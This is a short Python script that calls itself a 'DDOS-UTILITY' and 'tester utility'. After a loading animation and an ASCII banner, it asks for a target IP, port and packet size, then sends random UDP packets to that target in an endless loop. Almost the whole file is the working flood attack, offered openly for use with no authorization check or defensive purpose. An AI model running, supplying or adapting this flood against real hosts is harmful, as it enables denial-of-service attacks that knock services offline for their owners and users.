import os, time, socket, random

class Init():
  def __init__(self):
    try:
      os.system('cls' if os.name == 'nt' else 'clear')

      self.loading()

      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      print(" \n" + "         ██████╗ ██████╗  █████╗  ██████╗      ██╗   ██╗████████╗██╗██╗      \n" + "         ██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║   ██║╚══██╔══╝██║██║      \n" + "         ██║  ██║██║  ██║██║  ██║╚█████╗ █████╗██║   ██║   ██║   ██║██║      \n" + "         ██║  ██║██║  ██║██║  ██║ ╚═══██╗╚════╝██║   ██║   ██║   ██║██║     \n"+  "         ██████╔╝██████╔╝╚█████╔╝██████╔╝      ╚██████╔╝   ██║   ██║███████╗ \n" + "         ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝        ╚═════╝    ╚═╝   ╚═╝╚══════╝ \n" + "\n" + "                        DDOS-UTILITY -- BY SRGWRTG0342\n" + "                              A TESTER UTILITY\n" )
      ip = input("IP : ")
      port = input("PORT : ")
      numbytes = input("PACKET SIZE(bytes):")
      numbytes = int(numbytes)
      if numbytes != int(numbytes):
        print("Error!")

      bytes = random._urandom(int(numbytes))
      port = int(port)

      os.system('cls' if os.name == 'nt' else 'clear')
      time.sleep(3)
      sent = 0
      while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          print ("Send %s packets %s to port:%s"%(sent,ip,port))
    except:
      print("Exit!")

  def loading(self):
    ttt = "LOAD - █"
    tpt = "█"
    ztp = ""
    ttt = str(ttt)
    tpt = str(tpt)
    ztp = str(ztp)
    ttt = "LOADING - █"
    ttt = str(ttt)
    for i in range(10):
      time.sleep(0.05)
      os.system('cls' if os.name == 'nt' else 'clear')
      ttt += tpt
      print(ttt)
      time.sleep(0.05)
      os.system('cls' if os.name == 'nt' else 'clear')
Init()
